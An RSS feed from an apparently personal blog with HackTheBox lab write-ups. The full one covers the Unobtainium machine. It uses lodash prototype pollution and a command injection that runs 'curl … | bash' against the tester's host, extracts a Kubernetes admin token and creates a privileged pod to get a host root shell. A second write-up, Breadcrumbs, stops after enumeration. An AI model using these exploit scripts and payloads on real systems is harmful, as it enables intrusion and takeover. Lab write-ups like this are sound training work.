<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>HackTheBox | Mohamed ELLEUCH</title>
    <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
      <atom:link href="https://mohamed-elleuch.me/tag/hackthebox/index.xml" rel="self" type="application/rss+xml" />
    <description>HackTheBox</description>
    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright Â© Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 04 Sep 2021 00:00:00 +0000</lastBuildDate>
    <image>
      <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
      <title>HackTheBox</title>
      <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
    </image>
    
    <item>
      <title>HackTheBox - Unobtainium Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-unobtainium/</link>
      <pubDate>Sat, 04 Sep 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-unobtainium/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.235 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Discovered open port 80/tcp on 10.10.10.235
Discovered open port 22/tcp on 10.10.10.235
Discovered open port 31337/tcp on 10.10.10.235
Discovered open port 8443/tcp on 10.10.10.235
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;Nothing really interesting except for the 3 downloadable files!&lt;/p&gt;
&lt;img src=&#34;web.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s get the deb one!
&lt;img src=&#34;zip.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s now extract the files inside the .deb file that we got&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dpkg-deb -xv unobtainium_1.0.0_amd64.deb writeup
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;extract.png&#34;&gt;
&lt;p&gt;Inside ./opt/unobtainium/ we can find an executable&lt;/p&gt;
&lt;img src=&#34;exec.png&#34;&gt;
&lt;p&gt;We can solve this error by adding &lt;code&gt;unobtainium.htb&lt;/code&gt; to our /etc/hosts file&lt;/p&gt;
&lt;img src=&#34;exec1.png&#34;&gt;
&lt;p&gt;Nothing really interesting in the logs except of finding a potential username &lt;code&gt;felamos&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;exec2.png&#34;&gt;
&lt;p&gt;We can also Post messages, let&amp;rsquo;s try to capture the traffic with wireshark when sending a message&lt;/p&gt;
&lt;img src=&#34;wireshark.png&#34;&gt;
&lt;p&gt;We already capture some data even before sending any thing, which seems odd&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s check what he have&lt;/p&gt;
&lt;img src=&#34;wire1.png&#34;&gt;
&lt;img src=&#34;wire2.png&#34;&gt;
&lt;p&gt;Very interesting! we get creds&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;felamos:Winter2021
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And also we can see that there is a potential LFI! Let&amp;rsquo;s try to abuse it&lt;/p&gt;
&lt;p&gt;After trying few commun files &lt;code&gt;index.js&lt;/code&gt; gave me something&lt;/p&gt;
&lt;img src=&#34;ind.png&#34;&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var root = require(&amp;quot;google-cloudstorage-commands&amp;quot;);
const express = require(&#39;express&#39;);
const { exec } = require(&amp;quot;child_process&amp;quot;);     
const bodyParser = require(&#39;body-parser&#39;);     
const _ = require(&#39;lodash&#39;);                                                                  
const app = express();
var fs = require(&#39;fs&#39;);

const users = [                                                                               
  {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;},
  {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true},      
  ];

let messages = [];                             
let lastId = 1;                                

function findUser(auth) {                                                                     
  return users.find((u) =&amp;gt;                                                                    
    u.name === auth.name &amp;amp;&amp;amp;                                                                   
    u.password === auth.password);                                                            
    }                                    

app.use(bodyParser.json());                                                                   

app.get(&#39;/&#39;, (req, res) =&amp;gt; {                   
  res.send(messages);                                                                         
  });                                                                                           

app.put(&#39;/&#39;, (req, res) =&amp;gt; {   
  const user = findUser(req.body.auth || {});                                                 

  if (!user) {                                 
    res.status(403).send({ok: false, error: &#39;Access denied&#39;});                                
    return;
  }

  const message = {
    icon: &#39;__&#39;,
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
  });

app.delete(&#39;/&#39;, (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: &#39;Access denied&#39;});
    return;
  }

  messages = messages.filter((m) =&amp;gt; m.id !== req.body.messageId);
  res.send({ok: true});
  });
app.post(&#39;/upload&#39;, (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: &#39;Access denied&#39;});
    return;
  }


  filename = req.body.filename;
  root.upload(&amp;quot;./&amp;quot;,filename, true);
  res.send({ok: true, Uploaded_File: filename});
  });

app.post(&#39;/todo&#39;, (req, res) =&amp;gt; {
    const user = findUser(req.body.auth || {});
    if (!user) {
        res.status(403).send({ok: false, error: &#39;Access denied&#39;});
        return;
    }

    filename = req.body.filename;
        testFolder = &amp;quot;/usr/src/app&amp;quot;;
        fs.readdirSync(testFolder).forEach(file =&amp;gt; {
                if (file.indexOf(filename) &amp;gt; -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
        });

app.listen(3000);
console.log(&#39;Listening on port 3000...&#39;);

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can also get &lt;code&gt;package.json&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
  &amp;quot;name&amp;quot;: &amp;quot;Unobtainium-Server&amp;quot;,
  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
  &amp;quot;description&amp;quot;: &amp;quot;API Service for Electron client&amp;quot;,
  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
  &amp;quot;scripts&amp;quot;: {
    &amp;quot;start&amp;quot;: &amp;quot;node index.js&amp;quot;
  },
  &amp;quot;author&amp;quot;: &amp;quot;felamos&amp;quot;,
  &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot;,
  &amp;quot;dependencies&amp;quot;: {
    &amp;quot;body-parser&amp;quot;: &amp;quot;1.18.3&amp;quot;,
    &amp;quot;express&amp;quot;: &amp;quot;4.16.4&amp;quot;,
    &amp;quot;lodash&amp;quot;: &amp;quot;4.17.4&amp;quot;,
    &amp;quot;google-cloudstorage-commands&amp;quot;: &amp;quot;0.0.1&amp;quot;
  },
  &amp;quot;devDependencies&amp;quot;: {}
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There is an interesting /upload endpoint, let&amp;rsquo;s try if we can upload anything! but sadly that didn&amp;rsquo;t work, we didn&amp;rsquo;t have permissions&lt;/p&gt;
&lt;p&gt;After searching a bit we can find that loadsh 4.17.4 is vulnerable to Prototype Pollution&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://snyk.io/test/npm/lodash/4.17.4&#34;&gt;https://snyk.io/test/npm/lodash/4.17.4&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And also google-cloudstorage-commands is vulnerable to RCE&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&#34;&gt;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The next step to do now is pretty straightforward after knowing these 2 exploits!&lt;/p&gt;
&lt;p&gt;The /upload endpoint is what we&amp;rsquo;ll be looking for now! It will be enough to get us into the machine&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;
app.post(&#39;/upload&#39;, (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: &#39;Access denied&#39;});
    return;
  }


  filename = req.body.filename;
  root.upload(\&amp;quot;./\&amp;quot;,filename, true);
  res.send({ok: true, Uploaded_File: filename});
  });
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;First we need to pollute &lt;code&gt;canUpload&lt;/code&gt; and changes its value to &lt;code&gt;true&lt;/code&gt;. here a little python script to do it&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests

headers = {
    &#39;content-type&#39;: &#39;application/json&#39;,
}

data = &#39;{&amp;quot;auth&amp;quot;: {&amp;quot;name&amp;quot;: &amp;quot;felamos&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;Winter2021&amp;quot;}, &amp;quot;message&amp;quot;: {&amp;quot;__proto__&amp;quot;:{canUpload&amp;quot;:true}}}&#39;

response = requests.put(&#39;http://unobtainium.htb:31337/&#39;, headers=headers, data=data)
print(response.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;pollute.png&#34;&gt;
Looks like it worked!!
&lt;p&gt;Now all we need to do is upload a filename which is our payload!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;filename=&amp;quot;&amp;amp; PAYLOAD&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;rce.png&#34;&gt;
&lt;p&gt;Here&amp;rsquo;s a python script to do it&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests

headers = {
    &#39;Host&#39;: &#39;unobtainium.htb:31337&#39;,
    &#39;Connection&#39;: &#39;keep-alive&#39;,
    &#39;Content-Length&#39;: &#39;90&#39;,
    &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;,
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36&#39;,
    &#39;Content-Type&#39;: &#39;application/json&#39;,
    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
    &#39;Accept-Language&#39;: &#39;en-US&#39;,
}

data = &#39;{\\&amp;quot;auth\\&amp;quot;:{\\&amp;quot;name\\&amp;quot;:\\&amp;quot;felamos\\&amp;quot;,\\&amp;quot;password\\&amp;quot;:\\&amp;quot;Winter2021\\&amp;quot;},\\&amp;quot;filename\\&amp;quot;:\\&amp;quot;&amp;amp; curl 10.10.14.37:8000/x|bash\\&amp;quot;}&#39;

response = requests.post(&#39;http://unobtainium.htb:31337/upload&#39;, headers=headers, data=data, verify=False)

&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re on the box!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Running linpeas we can see that we&amp;rsquo;re in a container&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Is this a container? ........... Looks like we&#39;re in a Docker container
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Also a weird crontab that&amp;rsquo;s looking for the kubectl binary on the system and deletes it&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* * * * * find / -name kubectl -exec rm {} \;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;we can eaisly bypass this by changing the name of the binary&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Which is  the Kubernetes CLI tool that can enumerate and run commands against kubernetes clusters!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s get that binary into the box and start enumerating with it&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Following any kubectl cheatcheet can do the trick!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s find start by getting the namespaces&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc get namespaces
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;ns.png&#34;&gt;
&lt;p&gt;The interesting one is dev!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s now list the pods in the dev namespace&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc get pods -n dev
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;pods.png&#34;&gt;
&lt;p&gt;There is now an interesting feature which is describe which can give us almost all the informations we need&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  &amp;lt;none&amp;gt;
Status:       Running
IP:           172.17.0.5
IPs:
  IP:           172.17.0.5
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://27a4149a9c4cc6730f21a43124b0ac8fa67eed9a7934cab4f9d95a30d1878e38
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Fri, 03 Sep 2021 05:08:42 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Mon, 26 Jul 2021 15:00:22 +0000
      Finished:     Mon, 26 Jul 2021 15:04:55 +0000
    Ready:          True
    Restart Count:  30
    Environment:    &amp;lt;none&amp;gt;
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  &amp;lt;none&amp;gt;
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          &amp;lt;none&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like the pod is running on 172.17.0.5:3000&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s fordward it to our box&lt;/p&gt;
&lt;img src=&#34;forward.png&#34;&gt;
&lt;p&gt;Since we know that it&amp;rsquo;s vulnerable to loadsh and we can turn it into an RCE! we&amp;rsquo;ll be doing the same steps that we did for the foothold&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests

headers = {
    &#39;content-type&#39;: &#39;application/json&#39;,
}

data = &#39;{&amp;quot;auth&amp;quot;: {&amp;quot;name&amp;quot;: &amp;quot;felamos&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;Winter2021&amp;quot;}, &amp;quot;message&amp;quot;: {&amp;quot;__proto__&amp;quot;:{canUpload&amp;quot;:true}}}&#39;

response = requests.put(&#39;http://localhost:9090/&#39;, headers=headers, data=data)
print(response.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests

headers = {
    &#39;Host&#39;: &#39;localhost:9090&#39;,
    &#39;Connection&#39;: &#39;keep-alive&#39;,
    &#39;Content-Length&#39;: &#39;90&#39;,
    &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;,
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36&#39;,
    &#39;Content-Type&#39;: &#39;application/json&#39;,
    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
    &#39;Accept-Language&#39;: &#39;en-US&#39;,
}

data = &#39;{\\&amp;quot;auth\\&amp;quot;:{\\&amp;quot;name\\&amp;quot;:\\&amp;quot;felamos\\&amp;quot;,\\&amp;quot;password\\&amp;quot;:\\&amp;quot;Winter2021\\&amp;quot;},\\&amp;quot;filename\\&amp;quot;:\\&amp;quot;&amp;amp; curl 10.10.14.37:8000/x|bash\\&amp;quot;}&#39;

response = requests.post(&#39;http://localhost:9090/upload&#39;, headers=headers, data=data, verify=False,proxies={&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;})

&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;node.png&#34;&gt;
&lt;p&gt;and we get a shell in devnode&lt;/p&gt;
&lt;p&gt;Now let&amp;rsquo;s try if we can list secrets of the namespace kube-system&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc auth can-i list secrets -n kube-system
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;secret.png&#34;&gt;
&lt;p&gt;now let&amp;rsquo;s get them&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc get secrets -n kube-system
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;root@devnode-deployment-cd86fb5c-6ms8d:~/.euch# ./kc get secrets -n kube-system

NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      230d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      230d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      229d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      230d
..&amp;lt;snip&amp;gt;..
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;c-admin-token-tfmp2&lt;/code&gt; is the interesting one which will give us the administrator token&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc describe secrets/c-admin-token-tfmp2 -n kube-system
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;token.png&#34;&gt;
&lt;pre&gt;&lt;code&gt;eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now it&amp;rsquo;s pretty much over!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&#34;&gt;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The only think left to check is if we&amp;rsquo;re able to create pods&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc --token=&amp;lt;token&amp;gt; auth can-i create pod
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;bad.png&#34;&gt;
&lt;p&gt;now we can use badpod as mentioned in the article&lt;/p&gt;
&lt;p&gt;our yaml payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: localhost:5000/dev-alpine
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ &amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;--&amp;quot; ]
    args: [ &amp;quot;while true; do sleep 30; done;&amp;quot; ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s create the pod&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc create -f root.yaml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And let&amp;rsquo;s now get a root shell on the host&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./kc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow exec -it everything-allowed-exec-pod -- chroot /host bash
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;root.png&#34;&gt;
&lt;p&gt;And we rooted the machine!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Breadcrumbs Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-breadcrumbs/</link>
      <pubDate>Sat, 17 Jul 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-breadcrumbs/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.228 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have 6 ports open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH&lt;/li&gt;
&lt;li&gt;Webserver 80/443&lt;/li&gt;
&lt;li&gt;SMB&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s take a loot at both ports 80/443, but seems they both give us the same pages! We can work one of these&lt;/p&gt;
&lt;img src=&#34;e-book.png&#34;&gt;
&lt;p&gt;Seems like it&amp;rsquo;s an e-book library&lt;/p&gt;
&lt;img src=&#34;eth.png&#34;&gt;
&lt;p&gt;We have a search page for books, let&amp;rsquo;s try to play with it a bit&lt;/p&gt;
&lt;img src=&#34;ethtest.png&#34;&gt;
&lt;p&gt;I tried few manual enumeration but nothing seem to give me an interesting output!&lt;/p&gt;
